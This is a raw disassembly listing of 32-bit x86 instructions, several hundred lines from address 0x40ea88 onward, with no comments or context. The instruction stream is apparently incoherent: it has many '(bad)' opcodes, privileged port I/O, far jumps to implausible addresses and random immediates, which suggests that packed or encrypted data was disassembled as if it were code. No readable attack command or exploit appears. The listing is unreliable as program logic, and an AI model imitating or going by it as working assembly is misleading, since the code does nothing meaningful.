  40ea88:	in     al,0x7d
  40ea8a:	sub    al,0x90
  40ea8c:	pop    ebp
  40ea8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea8e:	and    DWORD PTR [edx],edx
  40ea90:	mov    BYTE PTR [ebx+0x3de37b80],bl
  40ea96:	or     dh,bl
  40ea98:	fs or  ebx,ebx
  40ea9b:	dec    edi
  40ea9c:	stos   BYTE PTR es:[edi],al
  40ea9d:	push   0x9fd981e
  40eaa2:	mov    bl,BYTE PTR [esi-0x1b301fd8]
  40eaa8:	int3   
  40eaa9:	cmp    ah,dh
  40eaab:	fstp   DWORD PTR [esi]
  40eaad:	out    dx,eax
  40eaae:	or     dh,BYTE PTR [ecx+0x5d]
  40eab1:	pop    ebp
  40eab2:	fisttp QWORD PTR ds:0xb76815ff
  40eab8:	ficomp WORD PTR [edi-0x73b46eed]
  40eabe:	arpl   WORD PTR [ebp+edx*1+0x4c5cdfd1],cx
  40eac5:	cmp    DWORD PTR [edx+ebx*4+0x41],0xc163dcb2
  40eacd:	push   DWORD PTR [edi-0x2dfc6642]
  40ead3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ead4:	aas    
  40ead5:	outs   dx,BYTE PTR ds:[esi]
  40ead6:	cmp    al,0x28
  40ead8:	inc    ebp
  40ead9:	aaa    
  40eada:	pop    ebx
  40eadb:	sub    dh,BYTE PTR ss:0x7e84d0a9
  40eae2:	scas   eax,DWORD PTR es:[edi]
  40eae3:	or     al,0xf7
  40eae5:	mov    al,ds:0xe58270b8
  40eaea:	inc    edx
  40eaeb:	jp     0x40eaa2
  40eaed:	bt     edi,edx
  40eaf0:	pop    ecx
  40eaf1:	add    BYTE PTR [ebp-0xf],bl
  40eaf4:	push   es
  40eaf5:	jmp    0x6fe69de9
  40eafa:	mov    ds:0xf889346b,eax
  40eaff:	jno    0x40eb2a
  40eb01:	sar    dh,1
  40eb03:	mov    BYTE PTR [ebx-0x2371b37d],cl
  40eb09:	xchg   DWORD PTR [edi-0x60],eax
  40eb0c:	retf   0xe8f9
  40eb0f:	loop   0x40eac0
  40eb11:	adc    BYTE PTR [esp+eiz*2-0x55de1605],dh
  40eb18:	fwait
  40eb19:	pushf  
  40eb1a:	xor    DWORD PTR [eax+0x7a4da6e0],ebp
  40eb20:	cld    
  40eb21:	je     0x40eaab
  40eb23:	or     DWORD PTR [esi-0x11],ecx
  40eb26:	push   ebx
  40eb27:	lods   al,BYTE PTR ds:[esi]
  40eb28:	fcomp  QWORD PTR [edi]
  40eb2a:	pop    ecx
  40eb2b:	cmp    bh,BYTE PTR [ebx+0x42]
  40eb2e:	mov    eax,ds:0xb40bd6b2
  40eb33:	sub    al,0x1
  40eb35:	enter  0x98b3,0xde
  40eb39:	test   al,0x91
  40eb3b:	ret    0x388b
  40eb3e:	icebp  
  40eb3f:	push   ss
  40eb40:	test   al,0x99
  40eb42:	xchg   edx,eax
  40eb43:	inc    edi
  40eb44:	pop    ds
  40eb45:	lea    eax,[ecx-0x72068a63]
  40eb4b:	(bad)  
  40eb4c:	sahf   
  40eb4d:	push   cs
  40eb4e:	rcl    BYTE PTR [ebx],1
  40eb50:	jl     0x40eb34
  40eb52:	push   edi
  40eb53:	xor    BYTE PTR [esp+eax*1],0x24
  40eb57:	push   ebx
  40eb58:	and    eax,0xb25d3f3d
  40eb5d:	inc    edi
  40eb5f:	push   ecx
  40eb60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb61:	fidivr DWORD PTR [edx+0x2a]
  40eb64:	or     bl,bh
  40eb66:	neg    DWORD PTR [edx]
  40eb68:	pop    edi
  40eb69:	jmp    FWORD PTR [ebx+0x72]
  40eb6c:	xchg   esp,eax
  40eb6d:	cmp    BYTE PTR [esi-0x7da9deba],0x2b
  40eb74:	sbb    al,0x4b
  40eb76:	test   eax,0xf65cf137
  40eb7b:	mov    esi,0x9cf27d8d
  40eb80:	outs   dx,DWORD PTR ds:[esi]
  40eb81:	rcr    BYTE PTR [edi-0x501f1b9e],1
  40eb87:	sbb    edi,DWORD PTR [ecx]
  40eb89:	stos   BYTE PTR es:[edi],al
  40eb8a:	out    dx,eax
  40eb8b:	out    0x7a,eax
  40eb8d:	jo     0x40eb51
  40eb8f:	jle    0x40eb6c
  40eb91:	loopne 0x40eba8
  40eb93:	add    BYTE PTR [esp+edi*2],bl
  40eb96:	iret   
  40eb97:	ret    0xef95
  40eb9a:	dec    ebp
  40eb9b:	ret    0x257e
  40eb9e:	mov    al,0xce
  40eba0:	or     eax,DWORD PTR [ebp+0x1b]
  40eba3:	sahf   
  40eba4:	fwait
  40eba5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eba6:	popf   
  40eba7:	push   es
  40eba8:	daa    
  40eba9:	out    0xed,al
  40ebab:	sbb    DWORD PTR [eax-0x32],eax
  40ebae:	lahf   
  40ebaf:	inc    esp
  40ebb0:	fcmove st,st(2)
  40ebb2:	cmp    BYTE PTR [eax-0x56af209b],bl
  40ebb8:	loopne 0x40ebbc
  40ebba:	add    cl,dl
  40ebbc:	dec    ebp
  40ebbd:	push   0xd2c00991
  40ebc2:	mov    ebp,0xc7d0c0fc
  40ebc7:	jae    0x40ebe0
  40ebc9:	adc    edi,DWORD PTR [edi-0x7ff6174e]
  40ebcf:	dec    DWORD PTR [eax+edx*2+0x5b]
  40ebd3:	stos   BYTE PTR es:[edi],al
  40ebd4:	xchg   esi,eax
  40ebd5:	xchg   ecx,eax
  40ebd6:	retf   
  40ebd7:	xlat   BYTE PTR ds:[ebx]
  40ebd8:	out    0x2,al
  40ebda:	adc    al,0x47
  40ebdc:	cwde   
  40ebdd:	cli    
  40ebde:	frstor [edx+0x57]
  40ebe1:	pop    ss
  40ebe2:	int3   
  40ebe3:	loop   0x40ebfa
  40ebe5:	mov    WORD PTR [eax+0x4a9dad48],ss
  40ebeb:	lock nop
  40ebed:	inc    edx
  40ebee:	push   esi
  40ebef:	mov    ebp,0xced06541
  40ebf4:	add    ebx,DWORD PTR [ebx]
  40ebf6:	mov    al,ds:0xbb5c4222
  40ebfb:	rol    DWORD PTR [edi-0x63dc53ed],0x1
  40ec02:	frstor [edx-0x35ada5cf]
  40ec08:	jecxz  0x40eb9f
  40ec0a:	mul    esi
  40ec0c:	mov    edi,0xa28b9baa
  40ec11:	mov    bh,0xc3
  40ec13:	(bad)  
  40ec14:	lock scas eax,DWORD PTR es:[edi]
  40ec16:	cwde   
  40ec17:	out    dx,al
  40ec18:	mov    ch,0x4c
  40ec1a:	imul   eax,DWORD PTR [edx+0x3d589ff2],0x37ca6ba9
  40ec24:	scas   eax,DWORD PTR es:[edi]
  40ec25:	shl    DWORD PTR cs:[ecx+ebx*1],0x83
  40ec2a:	lea    edi,[eax+0x36cdae15]
  40ec30:	mov    ebx,0xb606983a
  40ec35:	or     BYTE PTR [ecx+ebx*2-0x85e67a],ah
  40ec3c:	sar    ebp,cl
  40ec3e:	call   0xcd36f9db
  40ec43:	outs   dx,BYTE PTR ds:[esi]
  40ec44:	mov    ch,0x4c
  40ec46:	push   edx
  40ec47:	stc    
  40ec48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec49:	pop    edx
  40ec4a:	adc    BYTE PTR [ebx-0x7741ea65],dh
  40ec50:	add    al,0x75
  40ec52:	jns    0x40ec87
  40ec54:	iret   
  40ec55:	mov    eax,0x720039cd
  40ec5a:	lea    edi,[esi+ebx*4]
  40ec5d:	sub    al,0x38
  40ec5f:	adc    al,0xc0
  40ec61:	lods   al,BYTE PTR ds:[esi]
  40ec62:	dec    edx
  40ec63:	inc    ebx
  40ec64:	push   es
  40ec65:	or     bh,al
  40ec67:	mov    eax,0x7d428ea5
  40ec6c:	adc    bl,al
  40ec6e:	enter  0x365b,0x64
  40ec72:	out    dx,al
  40ec73:	fidivr DWORD PTR ds:0xbfc30a7a
  40ec79:	xor    BYTE PTR [esi+ecx*8-0x4b],ch
  40ec7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec7e:	xor    DWORD PTR [ebx+0x2f],ecx
  40ec81:	out    0xec,al
  40ec83:	mov    cl,0xc1
  40ec85:	xor    ebp,DWORD PTR [ecx+0x5ffafcc5]
  40ec8b:	fisttp QWORD PTR [edi-0x42e0be3f]
  40ec91:	jge    0x40ed06
  40ec93:	xchg   edi,eax
  40ec94:	add    dl,cl
  40ec96:	xor    ch,BYTE PTR [edi-0x603c6fa]
  40ec9c:	in     al,dx
  40ec9d:	jb     0x40ec5e
  40ec9f:	inc    ebx
  40eca0:	mov    al,0x53
  40eca2:	mov    dh,0xff
  40eca4:	and    al,0xcf
  40eca6:	fild   WORD PTR [ebx+0x16fe4068]
  40ecac:	sub    dl,BYTE PTR [ecx]
  40ecae:	repz retf 0x9c5
  40ecb2:	in     al,0x80
  40ecb4:	xchg   edx,eax
  40ecb5:	xchg   DWORD PTR [eax+0x1d],edx
  40ecb8:	les    eax,FWORD PTR [esi+0x36]
  40ecbb:	(bad)  
  40ecbc:	mov    eax,ds:0xb207d6c6
  40ecc2:	retf   
  40ecc3:	aaa    
  40ecc4:	test   BYTE PTR [ecx],cl
  40ecc6:	(bad)  
  40ecc8:	and    BYTE PTR [edi-0x4c],dh
  40eccb:	inc    esp
  40eccc:	ret    0x5292
  40eccf:	test   al,0xc9
  40ecd1:	in     al,dx
  40ecd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecd3:	call   0xf817ca9f
  40ecd8:	mov    DWORD PTR [esi-0x55],esi
  40ecdb:	dec    eax
  40ecdc:	jnp    0x40ec8a
  40ecde:	mov    cl,0xbb
  40ece0:	jg     0x40ed24
  40ece2:	xchg   ebx,eax
  40ece3:	cmp    bh,BYTE PTR [esi+0x542eb136]
  40ece9:	aaa    
  40ecea:	mov    cl,0x2d
  40ecec:	int    0x11
  40ecee:	dec    ebx
  40ecef:	sbb    BYTE PTR [esi],al
  40ecf1:	adc    dl,BYTE PTR [ecx+eax*1-0x47238810]
  40ecf8:	mov    edi,0xe56b459f
  40ecfd:	ror    edx,1
  40ecff:	pop    esp
  40ed00:	dec    esp
  40ed01:	adc    BYTE PTR [eax],0x21
  40ed04:	mov    esi,0x8cd233eb
  40ed09:	mov    eax,ds:0x863354a0
  40ed0e:	loope  0x40ed06
  40ed10:	xlat   BYTE PTR ds:[ebx]
  40ed11:	mov    edi,0xbc6086d7
  40ed16:	mov    esp,ebx
  40ed18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed19:	(bad)  
  40ed1a:	scas   al,BYTE PTR es:[edi]
  40ed1b:	jne    0x40ed55
  40ed1d:	mov    ds:0x43e425cf,al
  40ed22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed23:	adc    DWORD PTR [ebx+edi*8+0x7c169ef0],ebx
  40ed2a:	ja     0x40ecb9
  40ed2c:	pop    ecx
  40ed2d:	call   eax
  40ed2f:	jecxz  0x40ece5
  40ed31:	fwait
  40ed32:	or     bh,0xc1
  40ed35:	jp     0x40ed78
  40ed37:	sub    al,0xcf
  40ed39:	pushf  
  40ed3a:	inc    ebp
  40ed3b:	mov    edi,0x164f5e0f
  40ed40:	xor    ebx,DWORD PTR [ebp-0x1d8ef914]
  40ed46:	adc    ch,BYTE PTR [eax-0x4d]
  40ed49:	lds    esi,FWORD PTR ds:[edi+0x6faf5149]
  40ed50:	mov    ds:0x6be4e2c3,eax
  40ed55:	mov    eax,0x1996bcec
  40ed5a:	xchg   ecx,eax
  40ed5b:	mov    DWORD PTR [esi+0x60],esi
  40ed5e:	scas   eax,DWORD PTR es:[edi]
  40ed5f:	jne    0x40ed69
  40ed61:	mov    ch,0x17
  40ed63:	cmp    eax,0x8b5447d0
  40ed68:	jo     0x40ed12
  40ed6a:	mov    bl,0xdf
  40ed6c:	sti    
  40ed6d:	mov    DWORD PTR ds:0xd4c5afff,edx
  40ed73:	out    dx,al
  40ed74:	mov    ebp,0x12737b45
  40ed79:	jae    0x40ed71
  40ed7b:	fisttp DWORD PTR [ebx+0x292fd691]
  40ed81:	dec    ebx
  40ed82:	jbe    0x40edec
  40ed84:	xor    al,BYTE PTR [edi+0x62ec8510]
  40ed8a:	and    BYTE PTR gs:[esi],ah
  40ed8d:	sbb    esp,DWORD PTR [ecx-0x56]
  40ed90:	out    dx,eax
  40ed91:	mul    BYTE PTR [edi+edi*1]
  40ed94:	and    al,0x8a
  40ed96:	pop    esp
  40ed97:	sub    eax,0xdb805dad
  40ed9c:	ins    BYTE PTR es:[edi],dx
  40ed9d:	pushf  
  40ed9e:	mov    eax,ds:0xf8eb3fea
  40eda3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eda4:	add    al,0xd3
  40eda6:	dec    ecx
  40eda7:	fld    QWORD PTR [esi-0x67]
  40edaa:	inc    esp
  40edab:	dec    ebx
  40edac:	cld    
  40edad:	push   eax
  40edae:	sub    al,0x3c
  40edb0:	outs   dx,BYTE PTR ds:[esi]
  40edb1:	test   dl,dl
  40edb3:	mov    dh,0x33
  40edb5:	iret   
  40edb6:	loop   0x40edb4
  40edb8:	mov    gs,WORD PTR ds:0x54cffe6b
  40edbe:	xchg   esi,eax
  40edbf:	and    al,BYTE PTR [ecx-0x437474b5]
  40edc5:	aam    0x0
  40edc7:	pop    ebp
  40edc8:	xchg   ebx,eax
  40edc9:	sbb    BYTE PTR [eax+0x46],al
  40edcc:	mov    ds:0x979cd5a1,al
  40edd1:	dec    eax
  40edd2:	ins    DWORD PTR es:[edi],dx
  40edd3:	mov    ah,0x47
  40edd5:	mul    BYTE PTR [edx+0x3d]
  40edd8:	xchg   edx,eax
  40edd9:	push   esi
  40edda:	adc    BYTE PTR [edx],bh
  40eddc:	and    eax,0x4a38fca5
  40ede1:	mov    ds:0xa3322c77,eax
  40ede6:	xchg   ebp,edi
  40ede8:	xor    eax,0x117f1c89
  40eded:	fucomip st,st(3)
  40edef:	cmc    
  40edf0:	punpcklbw mm4,DWORD PTR [ecx-0x9]
  40edf4:	out    dx,al
  40edf5:	adc    dl,BYTE PTR [ecx+0x782ef856]
  40edfb:	das    
  40edfc:	test   al,ah
  40edfe:	mov    bh,0x73
  40ee00:	mov    dl,BYTE PTR [esi]
  40ee02:	dec    edx
  40ee03:	mov    ds:0x17f36659,al
  40ee08:	dec    ebx
  40ee09:	or     ebx,edx
  40ee0b:	jl     0x40ee3d
  40ee0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee0e:	ja     0x40edc3
  40ee10:	sar    DWORD PTR [esi],cl
  40ee12:	in     eax,0xa8
  40ee14:	jo     0x40ee68
  40ee16:	fmul   QWORD PTR [ebx]
  40ee18:	scas   al,BYTE PTR es:[edi]
  40ee19:	mov    ch,0xfb
  40ee1b:	or     ecx,DWORD PTR [edx+0x6a0c828e]
  40ee21:	fwait
  40ee22:	mov    ebx,0x4ecf1e61
  40ee27:	pop    edi
  40ee28:	addr16 mov dh,0x9
  40ee2b:	cli    
  40ee2c:	dec    BYTE PTR [ebx+ecx*1+0x1952b0aa]
  40ee33:	out    dx,eax
  40ee34:	in     al,dx
  40ee35:	lods   al,BYTE PTR ds:[esi]
  40ee36:	adc    BYTE PTR [esi],dh
  40ee38:	push   esp
  40ee39:	sbb    BYTE PTR [eax+0x21dcf635],0x30
  40ee40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee41:	sub    al,0x38
  40ee43:	sub    BYTE PTR [ebp-0x4c],0x18
  40ee47:	pushf  
  40ee48:	mov    ebx,0x183474b3
  40ee4d:	jnp    0x40ee65
  40ee4f:	daa    
  40ee50:	data16 adc cl,dh
  40ee53:	sub    al,0x6c
  40ee55:	or     BYTE PTR ds:0xba2ebaff,0xa7
  40ee5c:	add    BYTE PTR [edx-0x2387f0b6],ah
  40ee62:	mov    ecx,0xe5e90bc4
  40ee67:	ret    
  40ee68:	lods   al,BYTE PTR ds:[esi]
  40ee69:	push   esp
  40ee6a:	or     BYTE PTR [ebx-0x57],dl
  40ee6d:	mov    esi,0xb43a9fee
  40ee72:	adc    ebp,eax
  40ee74:	jmp    0x18892aab
  40ee79:	dec    edx
  40ee7a:	repz adc eax,0xc5fb8ece
  40ee80:	push   ds
  40ee81:	lods   al,BYTE PTR ds:[esi]
  40ee82:	adc    DWORD PTR [ebp-0x322254bc],edi
  40ee88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee89:	aam    0x62
  40ee8b:	mov    ds:0xbcffcee0,eax
  40ee90:	mov    cl,0x92
  40ee92:	jne    0x40ee88
  40ee94:	fwait
  40ee95:	xchg   DWORD PTR [edi+0x17],edx
  40ee98:	into   
  40ee99:	loope  0x40eea3
  40ee9b:	dec    ebx
  40ee9c:	mov    bh,0xe8
  40ee9e:	inc    eax
  40ee9f:	imul   esp,DWORD PTR [ecx],0x67fa92f5
  40eea5:	or     al,0x19
  40eea7:	jmp    0x27e6:0x950bc00f
  40eeae:	inc    ebx
  40eeaf:	shr    DWORD PTR [esi+ebx*8-0x27],1
  40eeb3:	pop    ds
  40eeb4:	bound  edx,QWORD PTR [ebp-0x9]
  40eeb7:	call   0x4e4542b1
  40eebc:	scas   al,BYTE PTR es:[edi]
  40eebd:	mov    ah,0xac
  40eebf:	mov    esi,0x2ae0fdd4
  40eec4:	push   es
  40eec5:	les    edi,FWORD PTR [eax]
  40eec7:	push   0xfffffff2
  40eec9:	pushf  
  40eeca:	mov    edi,0xf153bdd8
  40eecf:	mov    WORD PTR [eax+0x48],es
  40eed2:	xchg   esp,eax
  40eed3:	loop   0x40ef10
  40eed5:	sbb    al,0x75
  40eed7:	jp     0x40ee88
  40eed9:	pop    esp
  40eeda:	cmp    bh,bl
  40eedc:	div    BYTE PTR [edx]
  40eede:	xchg   ebp,eax
  40eedf:	xlat   BYTE PTR ds:[ebx]
  40eee0:	inc    esp
  40eee1:	jle    0x40ee8a
  40eee3:	ins    BYTE PTR es:[edi],dx
  40eee4:	mov    dh,0x7e
  40eee6:	test   BYTE PTR [ecx],bh
  40eee8:	call   FWORD PTR [edx]
  40eeea:	and    bl,BYTE PTR [ebx+0x6ff817c4]
  40eef0:	xor    eax,0x4aa71554
  40eef5:	mov    cl,0xa3
  40eef7:	sub    dh,al
  40eef9:	jg     0x40ef40
  40eefb:	mov    cl,0x47
  40eefd:	mov    ebp,0xc7128710
  40ef02:	mov    al,ds:0x9ec38e42
  40ef07:	pop    DWORD PTR [ebp-0x1d04bc65]
  40ef0d:	lock cs enter 0xa253,0xe7
  40ef13:	(bad)  
  40ef14:	fidiv  WORD PTR [eax-0x224f30b4]
  40ef1a:	jmp    0x99de:0xa0132889
  40ef21:	xchg   edx,eax
  40ef22:	fisttp DWORD PTR [ebp+0x4d309d42]
  40ef28:	inc    ebp
  40ef29:	xor    esp,DWORD PTR [edx]
  40ef2b:	sbb    dl,dl
  40ef2d:	fmul   DWORD PTR ss:[ecx]
  40ef30:	bound  eax,QWORD PTR [edi*4+0x3c50fe0c]
  40ef37:	lock in eax,dx
  40ef39:	ror    esp,1
  40ef3b:	push   edx
  40ef3c:	jecxz  0x40ef51
  40ef3e:	push   ebx
  40ef3f:	add    al,0xbe
  40ef41:	dec    esi
  40ef42:	add    al,0xc
  40ef44:	dec    ebx
  40ef45:	or     eax,0xe101ab15
  40ef4a:	mov    cl,0x24
  40ef4c:	cmp    esi,DWORD PTR [edi-0x24fa6fdb]
  40ef52:	aad    0xa7
  40ef54:	call   0x4412d3e4
  40ef59:	mov    ch,0x64
  40ef5b:	pop    esi
  40ef5c:	sbb    eax,0xb1e812fb
  40ef61:	pop    ss
  40ef62:	imul   ecx,DWORD PTR [edi-0x4f],0x32
  40ef66:	fsub   QWORD PTR [ecx-0x52cfc15e]
  40ef6c:	mov    DWORD PTR [ebp+0x3],esi
  40ef6f:	stc    
  40ef70:	jo     0x40ef70
  40ef72:	adc    al,0xce
  40ef74:	retf   
  40ef75:	sub    esi,DWORD PTR [ecx+0x19]
  40ef78:	test   al,0xb4
  40ef7a:	movups xmm3,xmm4
  40ef7d:	imul   DWORD PTR ds:0x73efe388
  40ef83:	cld    
  40ef84:	xchg   ebp,eax
  40ef85:	outs   dx,BYTE PTR ds:[esi]
  40ef86:	dec    ebp
  40ef87:	mov    ebx,0xa335f6b9
  40ef8c:	add    eax,0xa81493b9
  40ef91:	pop    edi
  40ef92:	outs   dx,BYTE PTR ds:[esi]
  40ef93:	jp     0x40efd7
  40ef95:	lods   al,BYTE PTR ds:[esi]
  40ef96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef97:	out    0xff,al
  40ef99:	aad    0x6e
  40ef9b:	popa   
  40ef9c:	test   al,0x9b
  40ef9e:	jnp    0x40ef26
  40efa0:	pop    edx
  40efa1:	ds push eax
  40efa3:	add    esp,ecx
  40efa5:	pop    edx
  40efa6:	xchg   edx,eax
  40efa7:	aas    
  40efa8:	or     ecx,DWORD PTR [esi+0x499b76a7]
  40efae:	cli    
  40efaf:	mov    dh,BYTE PTR [esi+ebp*1+0x70]
  40efb3:	fbld   TBYTE PTR [edx]
  40efb5:	xchg   DWORD PTR [edi-0xa],ebx
  40efb8:	call   0xaaf8:0xd846c1b0
  40efbf:	or     ecx,DWORD PTR [edi+0x48e2098c]
  40efc5:	or     al,0xe0
  40efc7:	cmp    bh,dl
  40efc9:	and    DWORD PTR [edx-0x3969ee3e],ecx
  40efcf:	je     0x40efe2
  40efd1:	add    al,BYTE PTR [ecx-0x10a61764]
  40efd7:	daa    
  40efd8:	stos   BYTE PTR es:[edi],al
  40efd9:	and    ebp,DWORD PTR [esi-0x20e4e720]
  40efdf:	outs   dx,BYTE PTR ds:[esi]
  40efe0:	push   cs
  40efe1:	fidiv  DWORD PTR [ecx+0x41defc89]
  40efe7:	loop   0x40f057
  40efe9:	scas   al,BYTE PTR es:[edi]
  40efea:	jp     0x40f019
  40efec:	jnp    0x40f005
  40efee:	stos   DWORD PTR es:[edi],eax
  40efef:	fst    QWORD PTR [edi+0x3e]
  40eff2:	dec    esi
  40eff3:	jns    0x40effe
  40eff5:	div    BYTE PTR [ecx]
  40eff7:	mov    cl,0xf4
  40eff9:	push   0xd58e2ffe
  40effe:	or     DWORD PTR [ebx+0x5f78b64f],edi
  40f004:	(bad)  
  40f006:	(bad)  
  40f008:	sub    eax,0x4405632e
  40f00d:	add    eax,eax
  40f00f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f010:	pop    eax
  40f011:	retf   
  40f012:	dec    ebp
  40f013:	mov    DWORD PTR ds:0xfe31e469,ebx
  40f019:	cs jae 0x40efd9
  40f01c:	imul   esi,ecx,0x5a194dd8
  40f022:	lds    ebp,FWORD PTR [eax-0x65]
  40f025:	data16 sub al,0xec
  40f028:	scas   al,BYTE PTR es:[edi]
  40f029:	rcr    dl,1
  40f02b:	mov    esi,0xd27bf238
  40f030:	aam    0x67
  40f032:	push   cs
  40f033:	xor    eax,0x670eaa1
  40f038:	push   ecx
  40f039:	mov    bl,0x22
  40f03b:	neg    BYTE PTR [esi-0x4501e258]
  40f041:	xchg   al,dh
  40f043:	imul   edi,DWORD PTR [esi-0x6dd8ba77],0xe104979d
  40f04d:	(bad)  
  40f04e:	jns    0x40f02d
  40f050:	xor    edx,esp
  40f052:	dec    ebx
  40f053:	xor    bh,bh
  40f055:	inc    esi
  40f056:	add    esp,esp
  40f058:	rol    DWORD PTR [ecx+0x4f],cl
  40f05b:	push   ds
  40f05c:	jmp    0x40eff9
  40f05e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f05f:	lahf   
  40f060:	sub    al,0x18
  40f062:	cmp    edi,DWORD PTR [edx]
  40f064:	fwait
  40f065:	mov    cl,0xde
  40f067:	mov    ecx,0x181ba335
  40f06c:	ds dec ebp
  40f06e:	call   0x5a75:0x6825fb8d
  40f075:	pop    es
  40f076:	mov    WORD PTR [ebx+esi*2+0x31aae612],ds
  40f07d:	mov    cl,0xd4
  40f07f:	(bad)  
  40f080:	retf   0x1a84
  40f083:	rcr    DWORD PTR ds:0xf213e0cb,0xe1
  40f08a:	jo     0x40f044
  40f08c:	pop    edi
  40f08d:	xchg   DWORD PTR [edi+0x47],ecx
  40f090:	imul   ebx,DWORD PTR [ebp-0x11e837b0],0xffffffaa
  40f097:	xor    edi,edx
  40f099:	(bad)  
  40f09a:	icebp  
  40f09b:	cli    
  40f09c:	retf   0x2fb2
  40f09f:	ss repz dec ebp
  40f0a2:	fninit 
  40f0a4:	int3   
  40f0a5:	cdq    
  40f0a6:	fcomp  QWORD PTR [esi]
  40f0a8:	xchg   bh,al
  40f0aa:	jp     0x40f0ab
  40f0ac:	xor    BYTE PTR [edi],ah
  40f0ae:	gs nop
  40f0b0:	fcmovu st,st(0)
  40f0b2:	jno    0x40f097
  40f0b4:	test   BYTE PTR [ebp-0x2c],ch
  40f0b7:	arpl   WORD PTR [edx+eiz*2+0x4b24148],bp
  40f0be:	xchg   edi,eax
  40f0bf:	xchg   BYTE PTR [edx-0x74],dl
  40f0c2:	enter  0x2080,0x72
  40f0c6:	div    eax
  40f0c8:	test   DWORD PTR [esi+0x37],edi
  40f0cb:	sbb    DWORD PTR [esi-0x20700c3a],eax
  40f0d1:	add    DWORD PTR [eax-0x31],esp
  40f0d4:	sbb    DWORD PTR [eax+0x480acfc8],ebx
  40f0da:	jmp    0x40f08a
  40f0dc:	out    0x70,eax
  40f0de:	inc    edi
  40f0df:	test   DWORD PTR [ebx-0x37a05684],esp
  40f0e5:	push   es
  40f0e6:	sahf   
  40f0e7:	mov    al,ds:0x2b911c92
  40f0ec:	or     al,0xb0
  40f0ee:	js     0x40f0bf
  40f0f0:	inc    esi
  40f0f1:	push   edx
  40f0f2:	add    BYTE PTR [esi+eax*1+0x7],ah
  40f0f6:	(bad)  
  40f0f7:	sbb    BYTE PTR [ebx+0x4f],bh
  40f0fa:	daa    
  40f0fb:	mov    eax,ds:0xfe8c7107
  40f100:	xchg   ebp,eax
  40f101:	or     al,0xb9
  40f103:	lds    ecx,FWORD PTR [esi-0xccad2c6]
  40f109:	mov    BYTE PTR [edx-0x4f881c78],0x7e
  40f110:	jne    0x40f186
  40f112:	loop   0x40f179
  40f114:	lahf   
  40f115:	test   ebp,edx
  40f117:	pop    eax
  40f118:	iret   
  40f119:	mov    ch,0x4d
  40f11b:	push   es
  40f11c:	test   eax,0x5326de12
  40f121:	out    0xa8,al
  40f123:	adc    al,0xc2
  40f125:	nop
  40f126:	jbe    0x40f190
  40f128:	aas    
  40f129:	pushf  
  40f12a:	int    0xb0
  40f12c:	out    dx,al
  40f12d:	iret   
  40f12e:	cmp    DWORD PTR [ebp+0x51],0xb9e6a28c
  40f135:	mov    ds:0x59c80c0e,eax
  40f13a:	xor    eax,0x1dd15424
  40f13f:	inc    eax
  40f140:	popf   
  40f141:	mov    edi,0xde3e8c8
  40f146:	jmp    0x84d8:0xeb54ceb
  40f14d:	out    dx,al
  40f14e:	jae    0x40f16e
  40f150:	das    
  40f151:	xor    al,0x6
  40f153:	stc    
  40f154:	popf   
  40f155:	lods   eax,DWORD PTR ds:[esi]
  40f156:	sbb    cl,BYTE PTR [esi+0x5f7902d0]
  40f15c:	dec    edi
  40f15d:	inc    esi
  40f15e:	imul   esi,DWORD PTR [edx-0x5f],0x1
  40f162:	add    cl,BYTE PTR [esi-0x115e92c4]
  40f168:	xchg   ecx,eax
  40f169:	call   0xb85f31fe
  40f16e:	push   esp
  40f16f:	jb     0x40f12f
  40f171:	ins    DWORD PTR es:[edi],dx
  40f172:	cs (bad) 
  40f174:	cs inc ebp
  40f176:	pop    edi
  40f177:	adc    DWORD PTR [ebp+0x1f07aef7],0x2d
  40f17e:	(bad)  
  40f17f:	in     eax,0x20
  40f181:	inc    eax
  40f182:	cld    
  40f183:	sbb    BYTE PTR [edi-0x77],ch
  40f186:	jae    0x40f11c
  40f188:	mov    eax,0xcecd420a
  40f18d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f18e:	dec    edi
  40f18f:	loop   0x40f1a1
  40f191:	mov    esi,DWORD PTR [ebx+0xf]
  40f194:	inc    ecx
  40f195:	aas    
  40f196:	out    dx,eax
  40f197:	push   ecx
  40f198:	sub    DWORD PTR [eax],edx
  40f19a:	jb     0x40f154
  40f19c:	data16 sbb ah,BYTE PTR [edx]
  40f19f:	xchg   esi,eax
  40f1a0:	inc    edx
  40f1a1:	sbb    al,0xe6
  40f1a3:	(bad)  
  40f1a4:	hlt    
  40f1a5:	cdq    
  40f1a6:	outs   dx,BYTE PTR ds:[esi]
  40f1a7:	test   eax,0x1a269fbc
  40f1ac:	xchg   ebp,eax
  40f1ad:	mov    esi,0x78a982e4
  40f1b2:	lods   eax,DWORD PTR ds:[esi]
  40f1b3:	adc    DWORD PTR [eax-0x18],edx
  40f1b6:	mov    edi,0xe9961452
  40f1bb:	bound  ecx,QWORD PTR ds:0xd9db310
  40f1c1:	rol    BYTE PTR [edx],cl
  40f1c3:	loopne 0x40f1d4
  40f1c5:	scas   eax,DWORD PTR es:[edi]
  40f1c6:	js     0x40f174
  40f1c8:	push   ebp
  40f1c9:	xor    BYTE PTR [ebp-0x30],cl
  40f1cc:	sub    eax,DWORD PTR [eax]
  40f1ce:	bound  ecx,QWORD PTR [eax-0x57b787f6]
  40f1d4:	sub    eax,0xf36be7f7
  40f1d9:	sar    BYTE PTR [esi+0x64],1
  40f1dc:	jge    0x40f21a
  40f1de:	jp     0x40f1f3
  40f1e0:	fimul  WORD PTR [edi+0x42]
  40f1e3:	std    
  40f1e4:	out    dx,al
  40f1e5:	js     0x40f225
  40f1e7:	xchg   ebx,eax
